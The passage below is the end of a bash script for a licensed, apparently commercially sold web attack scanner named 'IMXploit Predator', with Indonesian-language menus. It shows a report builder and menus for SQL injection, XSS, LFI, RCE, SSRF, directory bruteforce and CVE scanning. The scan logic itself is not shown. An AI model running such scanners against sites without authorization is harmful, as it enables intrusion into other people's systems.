            ["BLIND SQLi"]="sqli_blind.txt"
            ["XSS APOCALYPSE"]="xss_apocalypse.txt"
            ["LFI NUCLEAR"]="lfi_nuclear.txt"
            ["RCE MASTER"]="rce_master.txt"
            ["REDIRECT/SSRF"]="redirect_ssrf.txt"
            ["SUBDOMAINS"]="subdomains.txt"
            ["DIRECTORIES"]="directories.txt"
            ["BACKUPS"]="backups.txt"
            ["PARAMETERS"]="params.txt"
        )
        for name in "${!sections[@]}"; do
            echo "[ $name ]" >> "$report"
            echo "------------------------" >> "$report"
            [[ -f ~/${sections[$name]} ]] && cat ~/${sections[$name]} >> "$report" || echo "No findings" >> "$report"
            echo "" >> "$report"
        done
    } > "$report"
    echo -e "\n${HIJAU}   ✓ Report generated: $report${NC}"
    echo -ne "${KUNING}   └─ Press Enter...${NC}"; read
}

# ============== WELCOME MENU ==============
welcome_menu() {
    while true; do
        clear
        print_header
        echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║                    WELCOME MENU                            ║${NC}"
        echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  ${HIJAU}[1]${NC} 🔑 Aktivasi License                                    ║${NC}"
        echo -e "${CYAN}║  ${HIJAU}[2]${NC} 💳 Cara Beli                                           ║${NC}"
        echo -e "${CYAN}║  ${HIJAU}[3]${NC} ℹ️  Tentang Tools                                      ║${NC}"
        echo -e "${CYAN}║  ${MERAH}[0]${NC} ❌ Keluar                                              ║${NC}"
        echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
        echo -ne "${KUNING}└─ Pilih [0-3] : ${NC}"
        read choice
        case $choice in
            1) validate_license && main_menu ;;
            2) clear; echo -e "${CYAN}   DM TikTok @lugowo.hy untuk order${NC}"; echo -ne "${KUNING}   └─ Press Enter...${NC}"; read ;;
            3) clear; echo -e "${CYAN}   IMXploit Predator v$VERSION - 13 Fitur WORK${NC}"; echo -e "${CYAN}   Platform: $(detect_platform)${NC}"; echo -ne "${KUNING}   └─ Press Enter...${NC}"; read ;;
            0) echo -e "${HIJAU}   Thanks for using IMXploit Predator!${NC}"; exit 0 ;;
            *) echo -e "${MERAH}   [!] Pilihan tidak valid!${NC}"; sleep 1 ;;
        esac
    done
}

# ============== MAIN MENU ==============
main_menu() {
    while true; do
        clear
        print_header
        if [[ -f "$LICENSE_FILE" ]]; then
            expiry=$(cat "$LICENSE_FILE" | cut -d'|' -f2)
            days=$(( ( $(date -d "$expiry" +%s) - $(date +%s) ) / 86400 ))
            echo -e "${CYAN}   ════════════════════════════════════════════════════════════${NC}"
            echo -e "${CYAN}      🔥 LICENSE AKTIF: ${HIJAU}$days hari lagi${NC}  |  📌 $(detect_platform)${NC}"
            echo -e "${CYAN}   ════════════════════════════════════════════════════════════${NC}"
        fi
        echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║                    MAIN MENU                              ║${NC}"
        echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${CYAN}║  ${MERAH}[1]${NC}  💀 SQL Injection                                      ║${NC}"
        echo -e "${CYAN}║  ${KUNING}[2]${NC}  🕷️ XSS Scanner                                       ║${NC}"
        echo -e "${CYAN}║  ${HIJAU}[3]${NC}  📂 LFI Scanner                                        ║${NC}"
        echo -e "${CYAN}║  ${UNGU}[4]${NC}  💻 RCE Scanner                                        ║${NC}"
        echo -e "${CYAN}║  ${CYAN}[5]${NC}  🔀 Open Redirect + SSRF                               ║${NC}"
        echo -e "${CYAN}║  ${BIRU_MUDA}[6]${NC}  🌐 Subdomain Enum                                 ║${NC}"
        echo -e "${CYAN}║  ${KUNING_GELAP}[7]${NC}  📁 Directory Bruteforce                           ║${NC}"
        echo -e "${CYAN}║  ${MERAH}[8]${NC}  🛡️ CVE Checker                                       ║${NC}"
        echo -e "${CYAN}║  ${ABU}[9]${NC}  💾 Backup Finder                                      ║${NC}"
        echo -e "${CYAN}║  ${UNGU_MUDA}[10]${NC} 🔍 Parameter Discovery                               ║${NC}"
        echo -e "${CYAN}║  ${CYAN_MUDA}[11]${NC} 🔧 Technology Detector                               ║${NC}"
        echo -e "${CYAN}║  ${MERAH_MUDA}[12]${NC} 💔 Heartbleed Check                                 ║${NC}"
        echo -e "${CYAN}║  ${PUTIH}[13]${NC} 📄 Ultimate Report                                   ║${NC}"
        echo -e "${CYAN}║  ${MERAH}[0]${NC}  ❌ Keluar                                               ║${NC}"
        echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
        echo -ne "${KUNING}└─ Pilih [0-13] : ${NC}"
        read choice
        case $choice in
            1) scan_sqli ;;
            2) scan_xss ;;
            3) scan_lfi ;;
            4) scan_rce ;;
            5) scan_redirect ;;
            6) scan_subdomain ;;
            7) scan_dir ;;
            8) scan_cve ;;
            9) scan_backup ;;
            10) scan_param ;;
            11) scan_tech ;;
            12) scan_heartbleed ;;
            13) scan_report ;;
            0) exit 0 ;;
            *) echo -e "${MERAH}   [!] Pilihan tidak valid!${NC}"; sleep 1 ;;
        esac
    done
}

# ============== MAIN ==============
main() {
    clear
    print_header
    sleep 1
    check_license && main_menu || welcome_menu
}

main
